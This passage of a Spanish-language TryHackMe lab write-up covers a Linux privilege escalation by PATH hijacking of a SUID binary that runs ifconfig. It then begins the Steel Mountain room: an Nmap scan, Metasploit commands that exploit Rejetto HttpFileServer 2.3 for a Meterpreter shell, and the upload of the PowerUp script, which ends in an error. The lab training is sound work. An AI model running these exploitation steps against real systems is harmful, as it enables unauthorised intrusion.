	<img src="{{ 'assets/img/THM/Pasted image 20220806185702.png' | relative_url }}" text-align="center"/>
</div>

Este ejecutable da tres opciones de lo que parecen ser tres OS Commands distintos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806185747.png' | relative_url }}" text-align="center"/>
</div>

Es decir, que cabe la posibilidad de que este ejecutable ejecute a su vez comandos. Para comprobarlo empleamos el comando "strings" que nos saca del contenido del binario frases legibles:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806190106.png' | relative_url }}" text-align="center"/>
</div>

Esto eleva en gran medida las posibilidades de que ifconfig sea un comando ejecutado por el programa y como este a su vez tiene el SUID bit habilitado, ifconfig se ejecuta por root.

Esto nos lleva a la siguiente estrategia: Podemos crear un archivo ejecutable con el nombre de ifconfig en /tmp (ya que esta carpeta siempre tiene permisos de escritura) que abra una shell y seguidamente añadir /tmp a la variable PATH de nuestro usuario para que nuestro ifconfig malicioso se ejecute antes que el original.

Así, ejecutaríamos el binario, seleccionaríamos "ifconfig" y obtendríamos una shell de root:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806190013.png' | relative_url }}" text-align="center"/>
</div>

Finalizando la etapa de escalada de privilegios.

<br />

#### 7.4. Steel Mountain.

**Intro**

Enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

<br />

**Initial Access**

En primer lugar, con nuestra kali encendida ejecutamos un escaneo de puertos con Nmap:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806232600.png' | relative_url }}" text-align="center"/>
</div>

Observamos que tiene dos servidores web en los puertos 80 y 8080. Concretamente, el puerto 8080 tiene un *Rejetto HttpFileServer 2.3*:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806232716.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, iniciamos metasploit con el comando:

```bash
msfdb init && msfconsole -x db_status
```

Y buscamos un posible exploit, obteniendo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806233038.png' | relative_url }}" text-align="center"/>
</div>

De forma que lo utilizamos con los comandos:

```bash
use 0
options
set RHOSTS <Server-IP>
set RPORT 8080
exploit
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806233404.png' | relative_url }}" text-align="center"/>
</div>

Obteniendo finalmente una shell en Meterpreter:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806234724.png' | relative_url }}" text-align="center"/>
</div>

Sin embargo, a la hora de elevar privilegios, se nos informa de un error:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806234803.png' | relative_url }}" text-align="center"/>
</div>

Y cuando listamos los procesos existentes con la finalidad de intentar migrar a uno que se ejecute por el administrador encontramos que no hay:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220806234847.png' | relative_url }}" text-align="center"/>
</div>

Necesitamos por tanto más información y con dicho objetivo vamos a emplear un script de enumeración de la máquina que se llama [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) y que podemos subir a la máquina mediante la funcionalidad "upload de meterpreter":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220807000916.png' | relative_url }}" text-align="center"/>
</div>

Previamente hemos clonado el repositorio de git que contiene el script.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220807001053.png' | relative_url }}" text-align="center"/>
</div>

Para ejecutarlo cargaríamos el modulo de PowerShell e iniciariamos una shell de powershell con la que introduciríamos los siguientes comandos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220807003931.png' | relative_url }}" text-align="center"/>
</div>

Sin embargo un error impide ejecutar la función Invoke-AllChecks con lo que no se puede seguir por esta vía.

